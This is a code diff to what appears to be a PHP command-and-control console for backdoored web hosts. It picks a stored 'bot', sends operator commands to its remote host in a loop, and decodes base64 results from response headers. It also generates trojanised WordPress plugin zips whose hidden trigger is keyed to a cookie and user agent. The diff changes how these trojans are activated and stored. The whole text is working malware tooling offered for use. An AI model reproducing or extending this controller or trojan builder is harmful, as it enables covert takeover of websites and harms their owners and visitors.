@@ -114,7 +114,7 @@ while (true) {
             system(CLEAR);
             // need to add handling into this script for the new script filenames.
             $selectedEntry = pagination();
-            $bot = database->slopSqlite(['action' => "grabBot", "botID" => $selectedEntry]);
+            $bot = database->insertData(['action' => "grabBot", "botID" => $selectedEntry]);
             $coms = new genericClientExecuteCommands([
                     "base_uri" => sprintf("%s://%s", $bot[0]['proto'], $bot[0]['rhost']),
                     "timeout" => 5,
@@ -133,7 +133,7 @@ while (true) {
             $m->commandTypes();
             $type = readline("Which of the 3 options would you like to select (this will enter into a loop, so you can continue to execute commands press q to quit): ");
             do {
-                $bot = database->slopSqlite(['action' => "grabBot", "botID" => $selectedEntry]);
+                $bot = database->insertData(['action' => "grabBot", "botID" => $selectedEntry]);
                 $action = readline("What would you like to execute: ");
                 switch (true) {
                     case $action === "q":
@@ -172,7 +172,7 @@ HELPER.PHP_EOL;
                             break;
                         }
                         if (!is_null($command->getHeaderLine('D'))) {
-                            database->slopSqlite(["action" => "updateBot", "botID" => $selectedEntry, "newUri" => sprintf("/%s", $command->getHeaderLine('NewName'))]);
+                            database->insertData(["action" => "updateBot", "botID" => $selectedEntry, "newUri" => sprintf("/%s", $command->getHeaderLine('NewName'))]);
                             foreach (explode(":", base64_decode($command->getHeaderLine("D"))) as $output) {
                                 echo sprintf("\033[0;35m%s\033[0m", str_replace(";", "\n", trim($output))) . PHP_EOL;
                             }
@@ -208,19 +208,15 @@ HELPER.PHP_EOL;
                     break;
                 case str_contains($c, "chonker") !== false:
                     system(CLEAR);
-                    $act_word = trim(readline("Activation Keyword: "));
-                    if (is_null($act_word) or $act_word === "") {
-                        $act_word = bin2hex(openssl_random_pseudo_bytes(24));
-                    }
-                    $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
+                    $trj = new makeMeWordPressing(null, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
                     $yay = $trj->createChonker();
                     database->insertData([
                         "action" => "add_press",
                         "zip" => $yay['TrojanPlugin'],
-                        "activator" => $yay['ActivationWord'],
-                        'CookieName' => $a['CookieName'],
-                        'CookieVal' => $a['CookieVal'],
-                        'AllowedAgent' => $a['AllowedAgent']
+                        "UUID" => $yay['uuid'],
+                        'CookieName' => $yay['CookieName'],
+                        'CookieVal' => $yay['CookieValue'],
+                        'AllowedAgent' => $yay['AllowedAgent']
                     ]);
                     readline("Press the any key to continue.");
                     break;
